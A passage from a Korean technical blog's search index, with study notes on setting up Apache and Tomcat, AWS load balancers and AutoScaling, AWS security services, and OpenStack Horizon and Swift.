upgrade\r$ apt-get install -y apache2\r# apache2 설치\r$ systemctl enable apache2\r$ ufw allow 80/tcp\r# apache2 자동시작 및 방화벽 허용 등록\r$ apt-get install -y libapache2-mod-jk\r# 연동 모듈\r$ vi /etc/apache2/workers.properties\rworkers.tomcat_home=/usr/share/tomcat8\rworkers.java_home=/usr/lib/jvm/java-8-openjdk-amd64\rworker.list=tomcat8\rworker.tomcat8.port = 8009\rworker.tomcat8.host = [ 서로 다른 인스턴스 IP ]\rworker.tomcat8.type = ajp13\rworker.tomcat8.lbfactor = 1\r# 워커 파일 생성\r$ vi /etc/apache2/mods-available/jk.conf\rJkWorkersFile /etc/libapache2-mod-jk/workers.properties\r--\u0026gt; JkWorkersFile /etc/apache2/workers.properties\r$ vi /etc/apache2/sites-available/000-default.conf\rDocumentRoot /var/www/html\r--\u0026gt; DocumentRoot /var/lib/tomcat8/webapps/ROOT\rSetEnvIF Request_URI \u0026#34;/*.html\u0026#34; no-jk\rJkMount /*.jsp tomcat8\r# jsp 파일만 tomcat에서 실행 $ vi /var/www/html/index.html\r각 인스턴스에 따라 apache1 and apache2를 입력합니다.\r$ systemctl restart apache2\r Apache 설치   $ apt -y update $ apt -y upgrade\r$ apt-get install lrzsz\r# JAVA 간편 다운로드를 위한 Irzsz 설치\r$ apt-get install -y openjdk-8-jre\r$ apt-get install -y openjdk-8-jdk\r# JAVA 설치\r$ which javac\r$ readlink -f /usr/bin/javac\r# 자바 위치 확인\r$ vi /etc/profile\rexport JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64\rexport PATH=$JAVA_HOME/bin/:$PATH\rexport CLASS_PATH=$JAVA_HOME/lib/:$CLASS_PATH\r$ source /etc/profile\r# 환경변수 설정\r$ echo $JAVA_HOME\r$ $JAVA_HOME/bin/javac -version\r# 확인\r$ apt-get install tomcat8 -y\r# tomcat8 설치\r$ /usr/share/tomcat8/bin/version.sh\r# tomcat 설치 확인\r$ ufw allow 8080/tcp\r$ ufw allow 8009/tcp\r# 방화벽 포트 열기\r$ systemctl enable tomcat8\r# tomcat 자동시작\r$ apt-get install -y libapache2-mod-jk # 연동 모듈 설치\r$ vi /etc/tomcat8/server.xml\r\u0026lt;Connector port=\u0026#34;8009\u0026#34; protocol=\u0026#34;AJP/1.3\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt; 주석 헤제\r$ systemctl restart tomcat8\r$ vi /var/lib/tomcat8/webapps/ROOT/index.jsp\r\u0026lt;%@ page language=\u0026#34;java\u0026#34; contentType=\u0026#34;text/html; charset=utf-8\u0026#34;%\u0026gt;\r\u0026lt;!-- 로컬 정보 --\u0026gt;\rLocal IP : \u0026lt;%= request.getRemoteAddr() %\u0026gt;\u0026lt;br\u0026gt;\rLocal Host : \u0026lt;%= request.getRemoteHost() %\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;!-- 서버의 기본 경로 --\u0026gt;\rContext : \u0026lt;%= request.getContextPath() %\u0026gt; \u0026lt;br\u0026gt;\rURL : \u0026lt;%= request.getRequestURL() %\u0026gt; \u0026lt;br\u0026gt;\rURI : \u0026lt;%= request.getRequestURI() %\u0026gt; \u0026lt;br\u0026gt;\rPath : \u0026lt;%= request.getServletPath() %\u0026gt;\u0026lt;br\u0026gt;\rServer Port : \u0026lt;%= request.getServerPort() %\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\r서버 Root 경로 : \u0026lt;%= application.getRealPath(\u0026#34;/\u0026#34;) %\u0026gt;\u0026lt;br\u0026gt;\r서버 Root 경로 : \u0026lt;%= request.getRealPath(\u0026#34;/\u0026#34;) %\u0026gt;\u0026lt;br\u0026gt;\r\u0026lt;%\rString strServerIP = request.getServerName(); // 서버 ip\rString strServerPort = Integer.toString(request.getServerPort()); // 서버 port\rString serverRootUrl = \u0026#34;http://\u0026#34;+ strServerIP +\u0026#34;:\u0026#34;+ strServerPort +\u0026#34;/\u0026#34;; // Root 경로\rout.println(serverRootUrl );\r%\u0026gt;\r Tomcat 설치     Application Load Balancer 생성 ( 이하 ALB )   ALB에 대한 설명은 ALB Link를 참조해주세요.    ALB를 생성하기 위해 메뉴에서 로드 밸런서 -\u0026gt; 로드밸런서 생성을 클릭합니다.      로드 밸런서의 유형 중 ALB를 선택합니다.      위의 그림과 같이 ALB의 구성에 대한 설정을 진행합니다. 체계의 인터넷 연결은 외부대역과의 통신을 위한 설정이고, 내부는 서브넷끼리의 통신을 위한 설정입니다. 리스너는 로드 밸런서에서 읽은 포트를 설정합니다. 가용 영역은 로드 밸런서가 활성화될 가용 영역을 지정합니다.      보안그룹은 외부와의 통신을 위해 80/tcp를 모두에게 개방하게 설정합니다.      위의 그림과 같이 라우팅 구성에 대한 설정을 진행합니다. 대상 유형은 라우팅의 대상이 될 서비스를 지정하는 설정입니다. 프로토콜과 포트는 대상 유형의 라우팅을 지정하는 설정입니다. 상태검사는 경로로 접속하였을 때, 접속이 가능하면 Health, 불가능하면 Unhealth로 나타냅니다.      설정이 끝나면, 대상 등록에 인스턴스를 등록합니다.       ELB의 생성이 완료되면, DNS 접속을 통해 확인할 수 있습니다.      또한 대상 그룹으로 이동하여 healthy 상태를 체크할 수 있습니다.     Network Load Balancer 생성 ( 이하 NLB )  NLB에 대한 설명은 NLB Link를 참조해주세요.      NLB 생성을 위해 다시 로드밸런서로 돌아와, 로드 밸런서 생성을 클릭합니다.      로드 밸런서 유형에서 NLB를 선택합니다.      NLB의 구성을 위와 같이 설정합니다. 8009 포트는 톰캣과 아파치이 연동을 위한 포트 입니다.      라우팅 테이블을 구성합니다.      프라이빗 주소의 8009 포트로 인스턴스들을 등록합니다.     $ vi /etc/apache/workers.properties\rworker.tomcat8.host = [ NLB DNS ]\r Apache의 워커 파일은 NLB의 DNS로 설정합니다.      설정해 두었던 ALB로 접속하여 index.jsp로 접속하면 톰캣을 통해 jsp로 접속하는 것을 확인 할 수 있습니다.      대상그룹 또한 healthy를 확인할 수 있습니다.     Classic Load Balancer 생성 ( 이하 CLB )  CLB에 대한 설명은 CLB Link를 참조해주세요.    CLB를 생성하기 위해 다시 로드 밸런서 생성을 클릭하세요.      로드 밸런서 유형 중 CLB를 클릭하세요.      ELB와 동일하게 외부대역으로 설정합니다..      보안그룹 또한 기존 ELB-sg를 사용합니다.      상태검사를 설정합니다.    # 인스턴스를 추가하고, 로드 밸런싱을 활성화합니다.    # CLB의 DNS로 접속해보면, ELB와 같은 결과를 얻을 수 있습니다.    # CLB또한 상태검사가 가능합니다.     예제 1. 서로 다른 Public 서브넷 2개, Private 서브넷 2개를 생성하여 각각 인스턴스를 생성한 후, ELB로 접속이 가능하게 구현하세요.  \r예제 1. 답안\r↕\r\r VPC를 생성 후, ALB와 NLB를 사용합니다. \r\r\r\r "});index.add({'id':71,'href':'/docs/cloudcomputing/amazonwebservice/aws_security/','title':"AWS Security",'content':"AWS Security    기본적으로 AWS의 보안적 요소는 설비, 인프라 등과 관련된 물리적인 부분과 네트워크 인프라 등은 AWS가 책임을 지고 보안 대책을 수행합니다. 이러한 인프라 위의 OS, 애플리케이션, 네트워크 설정, 계정 관리 등은 사용자가 책임을 져야 하는 공유 책임 모델의 구조를 띄고 있습니다.    AWS가 제공하는 기본적인 보안 서비스      AWS 제공 서비스 서비스 개요     통신 경로 암호화 AWS 매니지먼트 콘솔로의 접속 또는 API를 사용할 때 HTTPS를 사용해 데이터를 암호화합니다.   Security Group\u0026amp; NetworkACL 인스턴스들의 보안 그룹과 서브넷들의 통신 허가/ 거부 설정을 하는 네트워크 ACL을 사용해 예상하지 못하는 통신을 사전차단합니다.   Identity and Access Management( IAM ) 사용자의 역할을 분리하고 최소한의 권한만을 부여하여 보안을 유지합니다.   Multi Factor Authentication ( MFA ) AWS 계정 또는 IAM 계정에 일회성 비밀번호 인증을 추가합니다.   Virtual Private Cloud ( VPC ) 퍼블릭 클라우드에 프라이빗 환경을 구축합니다. 다른 거점에서 VPN으로 접속할 수도 있습니다.   Direct Connect ( 전용선 연결 ) On Premise 환경에서 AWS 전용선을 통해 직접 연결하여 데이터 도청, 변조 등의 위험을 줄일 수 있습니다.   데이터 암호화 EBS, S3, Glacier, Redshift, RDS에 저장하고 있는 데이터 또는 객체를 암호화할 수 있습니다.   Hardware Security Module ( CloudHSM ) 암호화 키를 안전하게 저장하고 관리합니다.   Trusted Advisor AWS 지원이 제공하는 서비스 중에 하나로, 각종 서비스의 설정과 운용 상황을 확인해서 개선할 부분을 제공해줍니다.     Amazon Inspector    Amazon Inspector는 AWS에 배포된 애플리케이션의 보안 및 규정 준수를 개선하는데 도움이 되는 자동 보안 평가 서비스 모범 사례로부터 애플리케이션의 노출, 취약성 및 편차를 자동으로 평가 심각도 수준에 따라 우선순위가 지정된 상세한 보안 평가 결과 목록을 생성 Amazon EC2 인스턴스의 의도하지 않은 네트워크 접근성과 이 EC2 인스턴스의 취약성을 확인 Amazon Inspector 평가는 일반 보안 모범 사례 및 취약성 정의에 매핑된 사전 정의 규칙 패키지로 제공    AWS Artfact    AWS Artifact는 자신에게 해당되는 규정 준수와 관련된 정보를 제공하는 신뢰할 수 있는 중앙 리소스 AWS 보안 및 규정 준수 보고서와 엄선된 온라인 계약에 대한 온디맨드 액세스를 제공 보고서에는 SOC(Service Organization Control) 보고서와 PCI(Payment Card Industry) 보고서, 그리고 여러 지역의 인정 기구와 규정 준수 기관에서 AWS 보안 제어의 구현 및 운영 효율성을 입증하는 인증서가 포함    AWS CertificateManager    AWS Certificate Manager는 AWS 서비스 및 연결된 내부 리소스에 사용할 공인 및 사설 SSL/TLS(Secure Sockets Layer/전송 계층 보안) 인증서를 손쉽게 프로비저닝, 관리 및 배포할 수 있도록 지원하는 서비스 AWS Certificate Manager는 SSL/TLS 인증서를 구매, 업로드 및 갱신하는 데 드는 시간 소모적인 수동 프로세스를 대신 처리  SSL/ TLS, HTTPS  \rSSL/ TLS, HTTPS\r↕\r\r SSL/ TLS ( Secure Soket Layer, Transport Layer Security )  상위 계층 메시지를 분할, 압축하고 메시지 인증 코드 ( MAC )추가 및 암호화하는 작업을 수행하는 프로토콜 Handshake 프로토콜에서 클라이언트와 서버는 상대방을 확인하고 사용할 키 교환 방식, 암호화 방식, 생성에 필요한 값 등을 전달하여 암호화 채널 수립을 위한 항목들을 협상 단말 ( PC, server 등 )과 단만간의 암호화 통신을 위한 프로토콜 SSLv1은 최초의 버전으로서 문제가 많아 발표되지 않고 사장됨 SSLv2부터 공개가 되었으며 보다더 나은 버전인 SSLv3가 나왔으면 이를 기반으로 TLSv1 생성 TLSv1.0 v1.1, v1.2, v1.3이 나왔지만 아직 많은 브라우저에서 TLSv3을 지원하지 않음   SSL handshake  Client Hello: Client가 Server에게 자신이 사용가능한 Random byte( 대칭키 생성에 사용됨 ), Session ID, S니/ TLS 버전이 포함된 Cipher suite list를 전달 Server Hello: Server 가 Client가 보낸 Cipher suite List 중 하나를 선택해 전달 Client Key exchange: 키 교환 실시 ( 실제 데이터 암호화에 사용할 키를 전달하여, S니 인증서에서 추출된 공개키로 암호화 ) Server certificate: 서버의 인증서를 클라이언트에게 전송 Sever hello done: 서버 전달 종료 Change cipher Specs, Finished: 이후 보내는 메시지들은 협상된 암호화 알고리즘에 따라 보낼 것임을 통보 Finished, Change cipher Specs: 클라이언트가 보낸 메시지를 확인 후, handshake를 종료하고 하나의 대칭키로 통신한다고 통보  \r\r\r    AWS CloudHSM    AWS CloudHSM은 AWS 클라우드에서 자체 암호화 키를 손쉽게 생성 및 사용할 수 있도록 지원하는 클라우드 기반 하드웨어 보안 모듈(HSM) 사용자를 위해 하드웨어 프로비저닝, 소프트웨어 패치, 고가용성, 백업 등 시간 소모적인 관리 작업을 자동화하는 완전관리형 서비스 CloudHSM에서는 FIPS 140-2 레벨 3 인증 HSM을 사용하여 자체 암호화 키를 관리가능 모든 키를 대부분의 상용 HSM으로 내보내기 가능 CloudHSM을 사용하면 선결제 비용 없이 온디맨드로 HSM 용량을 추가 및 제거하여 신속하게 확장/축소가능   \rCloudHSM\r↕\r\r사용방법  AWS CloudHSM은 자체 Amazon Virtual Private Cloud(VPC)에서 실행되므로, Amazon EC2 인스턴스에서 실행되는 애플리케이션에 손쉽게 HSM을 사용 CloudHSM에서는 표준 VPC 보안 제어 기능을 사용하여 HSM에 대한 액세스를 관리가 가능 애플리케이션은 HSM 클라이언트 소프트웨어가 설정한 상호 인증된 SSL 채널을 사용하여 HSM에 연결 HSM은 고객의 EC2 인스턴스와 가까운 Amazon 데이터 센터에 위치하므로, 온프레미스 HSM과 비교하여 애플리케이션과 HSM 간 네트워크 지연 시간을 줄일 수 있음 업무 분리 및 역할 기반 액세스 제어는 AWS CloudHSM의 설계에 내제   AWS에서 하드웨어 보안 모듈(HSM) 어플라이언스를 관리하지만, 고객의 키에 대한 액세스 권한이 없음 고객이 자체 키를 제어하고 관리 애플리케이션 성능이 개선 다중 AZ(가용 영역)에 제공되는 변조 방지 하드웨어에 키를 안전하게 저장 고객의 HSM은 고객의 Virtual Private Cloud(VPC)에 상주하며 다른 AWS 워크로드와 격리 \r\r\r\r   AWS DirectoryService    AWS Directory Service는 다른 AWS 서비스에서 Amazon Cloud Directory 및 Microsoft Active Directory(AD)를 사용할 수 있는 몇 가지 방법을 제공하는 서비스 사용자, 그룹 및 디바이스에 대한 정보를 저장하고, 관리자는 이를 사용하여 정보 및 리소스에 대한 액세스를 관리 AWS Directory Service는 클라우드에서 기존 Microsoft AD 또는 LDAP(Lightweight Directory Access Protocol)–인식 애플리케이션을 사용하려는 고객에게 다양한 디렉터리 선택 옵션을 제공    AWS IAM    AWS 리소스에 대한 엑세스를 안전하게 제어할 수 있는 서비스로 IAM을 사용하여 리소스를 사용하도록 권한을 부여하거나 인증된 대상을 제어 IAM 정책은 \u0026ldquo;Action ( 어떤 서비스에 )\u0026quot;, \u0026ldquo;Resource ( 어떤 기능 또는 범위를 )\u0026quot;, \u0026ldquo;Effect ( 허가할 것인가 )\u0026ldquo;라는 3가지 규칙을 기반으로 AWS 서비스를 사용하는 데 필요한 권한을 설정 주요기능  AWS 계정에 대한 공유 엑세스 서비스별 세분화된 권한 제공 가능 EC2에서 실행되는 앱을 위한 AWS 리소스 엑세스 권한 제공 멀티 팩터 인증 ( MFA ) 자격 증명 연동   AWS 서비스들은 IAM Role을 할당받아 권한을 부여받을 수 있음 Access Key와 Secret Access Key를 직접 입력하지 않고 권한 부여 가능 IAM 사용자 계정을 만들어 사용자에게 적절한 권한을 부여하고 사용 가능한 서비스를 제한할 수 있음 사용자와 그룹은 N : N 의 관계가 성립이 가능   정책 ( Policy )  User, Group, Role이 사용할 수 있는 권한의 범위를 지정하는 것 S3FullAccess, Administrator Access 등 다양한 엑세스 권한이 이미 정의되어 있으며 이를 ‘AWS 관리형 이라 함 사용자 정의 정책 생성  JSON 형식 또는 직접 선택을 통해 사용자 정의 정책 선택 가능     역할 ( Role )  특정 권한을 가진 계정에 생성할 수 있는 IAM 자격증명 역할에는 다음과 같은 주체가 있음  AWS 계정의 IAM 사용자 AWS의 서비스 ( EC2, RDS, ELB 등 ) 외부 자격 증명 공급자 서비스에 의해 인증된 외부 사용자   역할 생성시 IAM 사용자, 서비스, 외부 사용자 등 주체를 정해야 함 하나의 역할에는 다수의 정책을 연결할 수 있음 생성된 역할을 서비스 혹은 IAM 사용자 등에 연결 Region에 국한되지 않고 사용 가능 신규 유저는 생성시 아무런 권한이 없으며 Access Key와 Secret Access Key가 할당 각 키는 최초 생성시에만 볼 수 있으며 즉시 보관해야 함   그룹\u0026amp; 사용자  사용자는 IAM 사용자를 의미하여 관리자 계정에 의해 부여받은 권한에 한해 제한된 서비스에 접근할 수 있는 계정을 의미 콘솔 로그인과 프로그래밍 엑세스 가능 여부를 선택하여 생성 가능 콘솔 로그인이 승인된 경우, 별도의 링크를 통해 콘솔에 로그인 할 수 있음 각 사용자마다 정책을 부여할 수 있음 사용자 모두에게 일일이 부여하기 힘들거나 그룹단위로 통제하고 싶은 경우, Group을 사용할 수 있음 그룹은 이미 생성된 사용자와 권한을 설정할 수 있으며, 그룹 내 모든 사용자는 그룹의 권한을 적용받음   특징  권한  AWS의 서비스나 자원에 어떤 작업을 할 수 있는지 명시해두는 규칙 \u0026quot; 서울 리전에 있는 모든 EC2를 조회할 수 있다\u0026rdquo; 와 같은 항목이 하나의 권한을 칭한다.   정책  권한들의 모음으로, 사용자나 권한들에 직접 적용은 불가능하며, 권한들로 만든 정책을 적용 정책은 사용자, 그룹, 역할에 적용할 수 있다.   사용자  사용자는 AWS의 기능과 자원을 이용하는 객체, 사용자별로 어떤 권한을 가졌는지 세분화해서 지정할 수 있으며, 사용자는 AWS Console에 접근할 수 있는 사람일 수도 있고, 자동화되어 실행되는 프로그램일 수도 있다. 접속하는 사용자인 경우에는 비밀번화가 제공되지만, 프로그램인 경우에는 액세스 키 ID와 비밀 엑세스 키가 제공된다.   그룹  여러 사용자에게 공통으로 권한을 부여할 수 있게 만들어진 개념이다. 하나의 그룹에 여러 명의 사용자를 지정이 가능   역할  어떤 행위를 하는 객체에 여러 정책을 적용한다는 점에서 사용자와 비슷ㅎ자ㅣ만 객체가 사용자가 아닌 서비스나 다른 AWS 계정의 사용자라는 점에서 차이가 있다. 사용자가 아닌 특정 서비스에서 생성한 객체에 권한을 부여하는 데 사용   인스턴스 프로파일  사용자가 사람을 구분하고 그 사람에 권한을 주기 위한 개념이었따면, 인스턴스 프로파일은 EC2 인스턴스를 구분하고 그 인스턴스에 권한을 주기 위한 개념      Amazon Cognito    Amazon Cognito는 웹 및 모바일 앱에 대한 인증, 권한 부여 및 사용자 관리를 제공 사용자는 사용자 이름과 암호를 사용하여 직접 로그인하거나 Facebook, Amazon, Google 또는 Apple 같은 타사를 통해 로그인가능 Cognito를 사용한 사용자 인증과 접속허가 종류  Identity Provider를 사용한 인증 Cognito를 사용한 Credential 발행 IAM 규칙   Cognito는 SQLite 데이터베이스를 사용, 시간적으로 마지막에 수정된 데이터를 우선적으로 하는 방침을 가짐 Cognito는 Identity Pool 단위를 사용    AWS KMS ( Key Management Service )    AWS Key Management Service(AWS KMS)는 데이터 암호화에 사용하는 암호화 키인 고객 마스터 키(CMK)를 쉽게 생성하고 제어할 수 있게 해주는 관리형 서비스    AWS Organizations    AWS Organizations는 AWS의 워크로드가 증가하고 확장됨에 따라 환경을 중앙에서 관리하는 서비스 계정 생성을 자동화하고, 비즈니스 요구를 반영하도록 계정 그룹을 생성하고, 거버넌스를 위해 이러한 그룹에 정책을 적용이 가능 AWS 계정에 대해 단일 결제 방법을 설정하여 결제 과정을 간소화가 가능 WS Organizations는 모든 AWS 고객이 추가 비용 없이 사용가능    AWS Shield    분산 서비스 거부 공격( DDoS )으로부터 웹 어플리케이션을 보호하는 서비스 Cloudfront와 통합되어 있기 때문에 AWS의 서비스가 아니더라도 Cloudfront의 origin이라면 보호가 가능   Shield의 종류  Shield Stanard  기본적으로 적용되는 서비스로 설정을 하지 않아도 AWS 서비스에 활성화 되어있음   Shield Advanced  추가 비용을 내고 추가적인 서비스를 제공받는 것으로 L7 트래픽 모니터링, 사후 분석 등의 기능을 제공      AWS WAF ( Web Application Firewall )    웹 방화벽으로 Cloudfront와 ALB를 통해 서비스를 제공 ( ALB와 Cloudfront를 직접 지정하여 웹방화벽을 제공 ) WAF을 활용하면 다양한 종류의 웹 공격에 대한 정보를 지닌 Rule을 선택하여 활성화하거나, 특정 Ip의 요청을 막을 수 있음   웹방화벽  방화벽이 L4/ L4 Layer의 방어 ( IP와 Port 차단 )을 이용 웹 방화벽은 L7( HTTP 헤더, HTTP 본문, URI 문자열, SQL 명령어, 스크립팅 )을 이용한 공격을 방어 \r\r "});index.add({'id':72,'href':'/docs/cloudcomputing/azuretraining/','title':"Azure Training",'content':" 정리 중\n"});index.add({'id':73,'href':'/docs/cloudcomputing/openstack/horizon/','title':"Horizon",'content':"외부 인터페이스 대시보드 서비스 : Horizon   외부 인터페이스 대시보드 서비스 : Horizon    사용자가 웹 UI로 인스턴스 생성, 삭제, 관리 등을 쉽고 빠르게 처리할 수 있게 지원 Horizon은 아파치 웹 서버를 사용 및 Python, Django 프레임워크로 구현     논리 아키텍처의 Horizon   논리 아키텍처에서 보이는 Horizon은 단순히 Horizon 자체 모듈만 존재 모든 서비스의 API와 연동해서 사용자에게 웹 서비스를 제공  "});index.add({'id':74,'href':'/docs/cloudcomputing/openstack/swift/','title':"Swift",'content':"오브젝트 스토리지 관리 서비스 : Swift    다른 서비스와는 다르게 단독으로 구성되며, 클라우드 스토리지 서비스 ( ex : 네이버 클라우드 ) Swift 서비스는 Object Storage 서비스 중 하나 분산 구조의 Object 데이터의 저장 스토리지 체계로 구성 빠른 성능 및 대용량 저장공간이 필요 할 때 사용 동영상, 이미지, 디스크 이미지 등의 대용량, 비정형 데이터를 파일과 메타데이터로 저장하여 분산 관리     오브젝트 스토리지 관리 서비스 : Swift   Swift의 논리 아키텍처     구성요소 역할     swift-proxy-server 사용자가 서비스를 다루기 위한 REST API 서비스   swift-account-server 계정 정보 및 사용자 정보를 관리하고 각 컨테이너 별 정보를 관리하기 위한 데몬 프로세스   swift-container-server 사용자 게정의 컨테이너를 간리하는 서비스   swift-object-server 실제 데이터를 저장하고 관리하는 서비스     어카운트, 컨테이너는 별도의 메타데이터가 데이터베이스로 관리 오브젝트는 저장 공간에 직접 저장되는 방식으로 구성 swift-proxy-server는 오픈스택의 Object API를 제공 사용자는 API를 사용해 데이터를 사용     Swift의 논리적 구성 요소    Swift서비스는은 스토리지 공간 여러 개를 합쳐 하나의 커다란 공간으로 가상화하고, 그 안에서 사용자만의 별도 스토리지 공간이 있는 것처럼 다시 가상화\n  swift-proxy-server는 스토리지 노드 여러 개를 관리하며 사용자 인증을 담당, 최근에는 Keystone으로 인증을 처리하며, 프록시 서버와 함께 설치\n  기본적으로 스토리지 노드에는 swift-account-server, swift,compute-server, swift-object-server가 실행되며 실제 메타데이터파일이나 오브젝트에 해당하는 데이터 파일을 저장\n  Swift 역시도 Nova를 구성할 떄와 마찬가지로 스토리지 노드가 여러 호스트로 구성이 가능\n  각 스토리지 노드에는 swift-account-server, swift-container-server, swift-object-server가 실행\n  서버들은 관리자가 설정한 해당 포트로 서로 통신\n  스토리지 노드 중 하나라도 손상이 되면 데이터를 잃지 않도록 데이터 복제(Replica)프로세스가 함께 실행\n     Swift Ring   스토리지 파일은 자신이 관리하는 데이터를 서로 공유하려고 Ring인 파일이 어느 노드에, 어떤 데이터가 들어 있는 지를 인지 이를 확인하기 위해 사용도는 것이 Ring 파일 Ring파일은 프록시 노드에서 생성해 모든 스토리지 노드가 동일하게 소유 Ring 파일에는 디바이스 정보  디바이스를 구분하는 ID 존(Zone) 번호 스토리지 노드 IP 포트 디바이스 이름 디바이스 비중 기타 디바이스 정보       Swift의 데이터 관리 방법    Swift는 사용자 게정을 관리하는 어카운트, 디렉터리 개념의 컨테이너, 실제 파일을 표현하는 오브젝트로 구성\n  Swift는 어카운트가 컨테이너를 포함하고, 컨테이너가 오브젝트를 포함하도록 관리\n  기본적으로 Swift에서는 프록시 노드 한 대에 스토리지 노드 다섯 대를 구성하기를 권장\n  프록시 노드들은 로드밸런서로 묶여 있어 사용자는 특정 URL 하나만 호출해도 스토리지 서비스를 자유롭게 사용가능\n  파일을 올릴 때는 설정된 리플리카로 여러 스토리지 노드로 분산해서 저장, 다운로드 시 그 중 한 곳을 사용\n     Swift와 Keystone    Swift에는 SwAuth를 이용하는 인증 방법과 Keystone을 이용\n  최근에는 Keystone을 이용해서 주로 인증하며, Keystone에는 프로젝트, 사용자, 롤이 있음\n  관리자(admin, swiftoperator)는 사용자와 컨테이너를 생성, 삭제할 수 있음\n  관리자는 오브젝트도 올리기, 내려받기, 삭제를 할 수 있음\n  일반 사용자(member)은 사용자와 컨테이너를 생성할 수 없음\n  일반 사용자는 관리자가 미리 생성해서 권한을 준 컨테이너만 사용할 수 있음\n  일반 사용자는 관리자가 설정한 권한으로 오브젝트 목록을 확인할 수 있음\n  일반 사용자는 관리자가 설장한 권한으로 데이터를 올리고 내릴 수 있음\n  특정 사용자에게 관리자(admin) 권한을 부여하려면 리셀러어드민(ResellerAdmin) 롤을 주어야 함\n  해당 사용자는 관리자가 할 수 있는 기능을 모두 사용할 수 있음\n     Swift의 이레이저 코딩(Eraure Coding) 기능과 스토리지 정책    스토리지 저장 공간을 효율적으로 관리하는 것이 이레이져 코딩\n  다양한 물리 스토리지 디바이스를 정책별로 사용할 수 있게 지원하는 스토리지 정책(Storage Policy)기능이 있음\n  이레이져 코딩은 HDFS, RAID 외의 스토리지에서 데이터 저장 공간의 효율성을 높이려고 설계된 데이터 복제 방식\n  이레이져 코딩은 이레이져 코드를 사용해 데이터를 인코딩하고, 데이터가 손실되면 디코딩 과정을 거쳐 원본 데이터를 복구하는 기법 중 하나\n  이레이저 코드와 각 코드마다 사용하는 알고리즘은 다양한데 이런 알고리즘에 Reed-Solom on Code, Tahoe-Lafs, Weaver Code 등이 있음\n  스토리지 정책은 여러 오브젝트링을 생성해 다양한 목적으로 클러스터를 세그먼트화 할 수 있음\n  수정된 해시링을 통해 클러스터에서 데이터가 있어야 할 위치를 결정\n  이레이저 코드를 사용해 콜드 스토리지(Cold Storage: 저전력 스토리지)도 정의 할 수 있음\n    "});index.add({'id':75,'href':'/docs/cloudcomputing/amazonwebservice/aws_analysis/','title':"AWS Analysis",'content':"AWS Analysis   Amazon Athena       Amazon CloudSearch       Amazon EMR       Amazon ES       Amazon Kinesis       Amazon QuickSight       AWS DataPipeline      #\n"});index.add({'id':76,'href':'/docs/cloudcomputing/awstraining/as/','title':"AWS AutoScaling",'content':"AWS AutoScaling    이번 장에서는 CloudComputing의 꽃이라고도 할 수 있는 AutoScaling 서비스를 구축해보겠습니다. AutoSacling의 대한 개념은 AutoScaling을 참조해주세요.    AWS AutoScaling ( 이하 As )      As 그룹 생성을 위해 AWS에 접속 합니다. 인스턴스를 생성하여, Apache가 자동시작되어있게 설정 후, AMI를 생성합니다. AMI 생성 참고      AMI 생성 후, As 그룹 생성을 위해 좌측의 메뉴에서 Auto Scaling \u0026gt; Auto Scaling 그룹 생성을 클릭합니다.      As그룹에서 시작하기를 클릭합니다.      내 AMI에서 생성한 AMI를 선택합니다.      AMI 선택이 완료되면 기본적인 시작 구성들을 입력합니다. 보안 그룹을 기존의 80번 포트가 열려있는 보안그룹을 사용했습니다.      기본 구성이 완료되면, 바로 As 그룹생성으로 이동됩니다. 그룹 생성에서 위의 그림과 VPC와 서브넷을 설정합니다. 여기서 시작구성에서 선택한 보안그룹과 선택한 보안그룹이 일치하지 않으면 에러가 발생합니다.      As 그룹생성에서 정책을 설정합니다.      평균 cpu의 사용이 5분간 30%이상이면 증가하는 정책을 생성합니다. 이와 동일하기 평균 cpu의 사용이 5분간 30%미만이면 삭제되는 정책을 생성합니다.      생성이 완료되면 As 보안그룹을 통해 인스턴스의 수, 최소, 최대 용량을 확인할 수 있습니다.      인스턴스가 생성된 것을 확인 할 수 있습니다.     $ apt -y update\r$ apt -y install stress\r$ stress -c 1\r 이제 As 확인을 위해 stress를 설치 후 작동시킵니다.      stress를 실행 후, 설정시간이 경과하면 인스턴스가 증가됨을 확인할 수 있습니다.      이와 같이 As를 통해 인스턴스를 정책에 따라 자동적으로 증가\u0026amp; 감소 시키는 것이 가능합니다. 또한 저번 장에서 구축했던 ELB에 As 그룹을 등록하면, 자동적으로 로드 밸런싱을 되어 유동적인 자원관리가 가능해집니다.     AWS CLI를 통한 생성  $ aws autoscaling create-launch-configuration \\\r--launch-configuration-name launch-config-sample \\\r--image-id [ AMI ID ] \\\r--key-name [ key name ] \\\r--no-ebs-optimized \\\r--instance-type [ instance type ] \\\r--instance-monitoring Enabled=true \\\r--security-groups [ 보안그룹 ID ] \\\r--associate-public-ip-address\r  As 주요 설정 파라미터\n    항목 이름 설명     Auto Sacling Group Name As 그룹명   Launch Configuration As 그룹에서 사용할 Launch Configuration   Load Balancers As 그룹에서 사용할 ELB   Desired As 그룹조건에 해당하지 않는 일반적인 인스턴스의 수   Min As 그룹에서 사용할 인스턴스의 최솟값   Max As 그룹에서 사용할 인스턴스의 최댓값   Health Check Type As 그룹에서 사용할 헬스 체크 판단 유형 ( EC2 or ELB )   Health Check Period As 그룹의 헬스 체크가 시작될 때 까지의 초   Termination Policies As 그룹에 속한 인스턴스의 삭제방침   Availability Zone As 그룹이 사용할 가용영역   Subnet As 그룹이 사용할 서브넷   Default Cooldown 스케일링 처리 후에 새로운 스케일링 처리를 받을 때 까지의 시간   Placemenet Group 낮은 레이턴시 ( Latency ) 환경과 논 블로킹 통신이 가능한 Placement Group을 선택   Suspended Processes 처리를 일시적으로 정지시킬 프로세스 목록 ( AWS CLI의 suspend-processes 명령어로 설정 )   Enabled Metrics CloudWatch 에서 활성화 되어 있는 매트릭스 목록         Scaling Policy 유형\n    유형 설명     ChangelnCapacity 그룹의 현재 용량을 지정한 수의 인스턴스만큼 늘리거나 줄입니다.   ExactCapacity 그룹의 현재 용량을 지정된 수의 인스턴스로 변경합니다.   PercentChangelnCapacity 그룹의 현재 용량을 지정된 비율만큼 늘리거나 줄입니다.         Scaling Policy의 주요 파라미터\n    항목 이름 설명     Scaling policy Name 이름 지정   Execute policy when 실행할 조건 ( CloudWatch의 Alram으로 설정 )   Take the action Auto Scaling Group의 목표 인스턴스 수를 설정   And than wait 다른 스케일링 처리가 실행되고 있을 때 대기할 시간     "});index.add({'id':77,'href':'/docs/cloudcomputing/awstraining/rds/','title':"AWS RDS 생성",'content':"AWS RDS 생성    AWS RDS는 우리가 흔히 아는 Database ( Oracle db, Mysql, MariaDB )와 동일한 역할을 수행하지만, 보다 편리하고 